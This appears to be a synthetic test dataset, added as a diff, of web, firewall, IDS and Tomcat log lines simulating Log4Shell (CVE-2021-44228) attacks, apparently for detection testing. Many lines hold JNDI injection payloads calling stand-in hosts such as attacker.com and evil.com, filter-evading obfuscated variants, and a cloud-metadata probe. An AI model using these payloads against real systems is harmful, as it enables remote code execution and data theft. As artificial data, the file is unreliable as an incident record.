@@ -1,0 +1,347 @@
+# ============================================================
+# Log4Shell (CVE-2021-44228) 攻击测试数据集
+# 生成时间: 2024-12-20
+# 包含: JNDI注入、LDAP/RMI协议利用、WAF阻断、IDS告警
+# ============================================================
+2024-12-20 11:06:30 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 125 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:39:00 45.154.255.147 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:25:00 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 248 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:19:00 10.0.0.50 - - "GET /api/login HTTP/1.1" 200 252 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:55:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:00:00 23.129.64.213 - - "GET /login?q=${jndi:dns://dns.log4shell.attacker.com} HTTP/1.1" 200 300 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:12:00 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 348 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+Dec 20 12:05:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 103.35.74.12:11912 payload=${jndi:ldap://...}
+2024-12-20 10:28:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:06:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:43:00 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 257 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:11:00 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 210 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:21:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 70 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:45:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 239 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+Dec 20 12:10:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 91.121.87.18:50189 payload=${jndi:ldap://...}
+2024-12-20 11:35:00 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 50 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:25:30 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 414 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:00:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 11:55:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:15:00 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 373 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+Dec 20 11:30:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 103.35.74.12:15300 payload=${jndi:ldap://...}
+2024-12-20 10:18:00 192.168.1.101 - - "GET /api/login HTTP/1.1" 200 291 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:46:00 198.51.100.50 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:12:30 192.168.1.101 - - "GET /api/login HTTP/1.1" 200 204 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:33:00 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 247 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:15:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:31:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 494 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:34:30 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 114 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+Dec 20 10:25:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 185.220.101.46:16092 payload=${jndi:ldap://...}
+2024-12-20 10:13:00 91.121.87.18 - - "GET /api/user?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://... HTTP/1.1" 200 132 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:33:30 91.121.87.18 - - "GET /api/search?q=${jndi:rmi://127.0.0.1:1099/Object} HTTP/1.1" 200 372 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:32:00 192.168.1.100 - - "GET /static/main.js HTTP/1.1" 200 276 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:18:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 11:17:30 23.129.64.213 - - "GET /api/user?q=${jndi:ldap://192.168.1.50:1389/Base64/Base64/Base64} HTTP/1.1" 200 291 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:58:30 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 156 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:32:30 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 322 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:12:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:27:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 11:05:00 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 487 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:13:30 23.129.64.213 - - "GET /api/user?q=${jndi:ldap://evil.com/Exploit} HTTP/1.1" 200 291 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:34:30 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 337 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:44:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 475 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 12:25:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:10:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:10:30 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 58 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:55:30 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 130 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:44:00 103.35.74.12 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:30:30 192.168.1.100 - - "GET /api/products HTTP/1.1" 200 368 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:53:30 198.51.100.50 - - "GET /api/user?q=${jndi:dns://dns.log4shell.attacker.com} HTTP/1.1" 200 295 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:18:00 45.154.255.147 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:38:00 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 180 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:56:00 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 493 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:47:30 103.35.74.12 - - "GET /api/search?q=${jndi:ldap://192.168.1.100:1389/Exploit} HTTP/1.1" 200 285 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:19:00 185.220.101.46 - - "GET /login?q=${jndi:rmi://127.0.0.1:1099/Object} HTTP/1.1" 200 275 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:07:30 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 292 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:50:30 103.35.74.12 - - "GET /api/user?q=${jndi:rmi://198.51.100.50/Exploit} HTTP/1.1" 200 362 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:45:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 11:16:00 192.168.1.100 - - "GET /api/products HTTP/1.1" 200 286 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:27:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:22:00 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 278 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:08:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 67 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+Dec 20 10:55:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 91.121.87.18:26942 payload=${jndi:ldap://...}
+2024-12-20 10:01:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:33:30 catalina.out: JNDI lookup for [${jndi:rmi://127.0.0.1:1099/Object}] was bound to Reference
+2024-12-20 10:23:00 185.220.101.46 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:03:30 103.35.74.12 - - "GET /api/search?q=${jndi:ldap://169.254.169.254/latest/meta-data} HTTP/1.1" 200 402 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:32:30 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 121 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:50:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:41:00 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 249 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:35:00 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 105 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:01:00 198.51.100.50 - - "GET /api/user?q=${jndi:ldap://192.168.1.100:1389/Exploit} HTTP/1.1" 200 259 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+Dec 20 10:35:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 91.121.87.18:34734 payload=${jndi:ldap://...}
+2024-12-20 10:32:00 catalina.out: JNDI lookup for [${jndi:ldap://192.168.1.100:1389/Exploit}] was bound to Reference
+2024-12-20 10:51:30 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 192 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:23:30 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 449 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:11:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:46:30 103.35.74.12 - - "GET /api/search?q=${lower:l${lower:d${lower:a${lower:p}}}:${lower:r${lower:m${lower:i}}}://... HTTP/1.1" 200 497 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:42:30 192.168.1.101 - - "GET /api/login HTTP/1.1" 200 449 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:48:00 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 334 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:35:30 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 84 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:26:00 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 360 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:37:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:38:30 10.0.0.50 - - "GET /static/main.js HTTP/1.1" 200 156 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:14:00 185.220.101.46 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:45:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+Dec 20 10:50:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 185.220.101.46:49294 payload=${jndi:ldap://...}
+2024-12-20 10:21:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 11:37:00 catalina.out: JNDI lookup for [${jndi:ldap://185.220.101.46:389/Payload}] was bound to Reference
+2024-12-20 10:49:30 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 209 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:05:00 192.168.1.100 - - "GET /static/main.js HTTP/1.1" 200 50 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:33:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:20:00 185.220.101.46 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:29:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 493 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:23:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 324 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:01:30 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 264 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:17:00 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 427 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:09:00 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 454 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:40:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+Dec 20 12:20:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 45.154.255.147:15059 payload=${jndi:ldap://...}
+2024-12-20 10:03:00 185.220.101.46 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:00:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:27:00 catalina.out: JNDI lookup for [${jndi:ldap://185.220.101.46:389/Payload}] was bound to Reference
+2024-12-20 10:14:30 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 104 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:10:30 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 417 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+Dec 20 11:55:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 23.129.64.213:59539 payload=${jndi:ldap://...}
+2024-12-20 10:12:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:05:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:20:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:20:00 catalina.out: JNDI lookup for [${jndi:ldap://192.168.1.50:1389/Base64/Base64/Base64}] was bound to Reference
+Dec 20 12:15:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 103.35.74.12:31673 payload=${jndi:ldap://...}
+2024-12-20 11:29:00 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 169 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:15:30 23.129.64.213 - - "GET /admin?q=${jndi:rmi://attacker.com/CallBack} HTTP/1.1" 200 325 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+Dec 20 10:10:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 91.121.87.18:53386 payload=${jndi:ldap://...}
+2024-12-20 10:47:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:00:00 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 77 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+Dec 20 10:40:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 45.154.255.147:30252 payload=${jndi:ldap://...}
+2024-12-20 10:38:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 223 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:40:30 10.0.0.50 - - "GET /static/main.js HTTP/1.1" 200 311 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:25:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:54:00 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 342 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:21:00 23.129.64.213 - - "GET /api/user?q=${jndi:rmi://attacker.com/CallBack} HTTP/1.1" 200 307 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:47:00 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 119 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:04:30 10.0.0.50 - - "GET /api/products HTTP/1.1" 200 439 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:11:00 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 474 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:35:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:37:00 91.121.87.18 - - "GET /admin?q=${jndi:ldap://185.220.101.46:389/Payload} HTTP/1.1" 200 346 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:03:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 322 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+Dec 20 10:00:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 45.154.255.147:48417 payload=${jndi:ldap://...}
+2024-12-20 11:17:30 catalina.out: JNDI lookup for [${jndi:ldap://192.168.1.50:1389/Base64/Base64/Base64}] was bound to Reference
+Dec 20 10:15:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 185.220.101.46:44775 payload=${jndi:ldap://...}
+2024-12-20 11:24:00 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 339 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:12:30 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 198 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:20:30 192.168.1.101 - - "GET /static/main.js HTTP/1.1" 200 427 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:07:00 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 318 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:29:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:35:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:10:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 12:10:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 11:19:30 192.168.1.100 - - "GET /api/health HTTP/1.1" 200 182 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:08:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:43:30 103.35.74.12 - - "GET /admin?q=${jndi:dns://dns.log4shell.attacker.com} HTTP/1.1" 200 217 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:50:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:29:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 393 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:36:00 10.0.0.50 - - "GET /static/style.css HTTP/1.1" 200 296 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:06:00 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 51 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:39:00 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 374 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:09:00 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 487 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:07:00 192.168.1.100 - - "GET /api/products HTTP/1.1" 200 233 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:30:00 185.220.101.46 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 11:28:30 192.168.1.100 - - "GET /static/main.js HTTP/1.1" 200 72 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:40:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:10:00 10.0.0.50 - - "GET /api/login HTTP/1.1" 200 409 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:37:30 45.154.255.147 - - "GET /login?q=${jndi:ldap://192.168.1.50:1389/Base64/Base64/Base64} HTTP/1.1" 200 127 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:33:00 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 499 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:00:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+2024-12-20 10:15:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:03:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:05:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
+Dec 20 10:20:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 23.129.64.213:14159 payload=${jndi:ldap://...}
+2024-12-20 10:43:00 103.35.74.12 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:57:00 catalina.out: JNDI lookup for [${jndi:ldap://evil.com/Exploit}] was bound to Reference
+2024-12-20 11:20:30 192.168.1.101 - - "GET /api/health HTTP/1.1" 200 262 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:23:30 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 205 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:30:30 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 131 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 11:24:30 198.51.100.50 - - "GET /admin?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://... HTTP/1.1" 200 361 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:26:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:09:00 app[error]: Exception thrown processing ${jndi:ldap://...}
+2024-12-20 10:13:30 catalina.out: JNDI lookup for [${jndi:ldap://evil.com/Exploit}] was bound to Reference
+2024-12-20 11:14:30 192.168.1.100 - - "GET /static/style.css HTTP/1.1" 200 122 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:06:30 192.168.1.101 - - "GET /api/login HTTP/1.1" 200 264 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:40:00 198.51.100.50 - - "GET /login?q=${jndi:ldap://185.220.101.46:389/Payload} HTTP/1.1" 200 189 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:25:00 103.35.74.12 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:29:30 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 390 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+Dec 20 11:40:00 firewall: BLOCK [CVE-2021-44228] JNDI injection from 23.129.64.213:18436 payload=${jndi:ldap://...}
+2024-12-20 10:51:00 catalina.out: JNDI lookup for [${lower:l${lower:d${lower:a${lower:p}}}:${lower:r${lower:m${lower:i}}}://...] was bound to Reference
+2024-12-20 11:21:30 192.168.1.101 - - "GET /static/style.css HTTP/1.1" 200 52 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 10:42:00 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 98 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:16:00 198.51.100.50 - - "GET /admin?q=${jndi:ldap://169.254.169.254/latest/meta-data} HTTP/1.1" 200 105 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:40:00 91.121.87.18 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:59:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 104 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:49:00 192.168.1.101 - - "GET /api/login HTTP/1.1" 200 121 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
+2024-12-20 10:19:00 23.129.64.213 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:24:00 45.154.255.147 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:00:00 198.51.100.50 - - "GET /?user=${jndi:ldap://attacker.com/a} HTTP/1.1" 403 -
+2024-12-20 10:37:00 45.154.255.147 - - "GET /admin?q=${jndi:ldap://192.168.1.100:1389/Exploit} HTTP/1.1" 200 304 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:09:30 10.0.0.50 - - "GET /api/health HTTP/1.1" 200 81 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 11:37:30 192.168.1.100 - - "GET /api/login HTTP/1.1" 200 263 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+2024-12-20 11:02:30 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 182 "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0"
+2024-12-20 10:30:00 ids[999]: ALERT [CVE-2021-44228] Potential Log4j RCE attempt detected
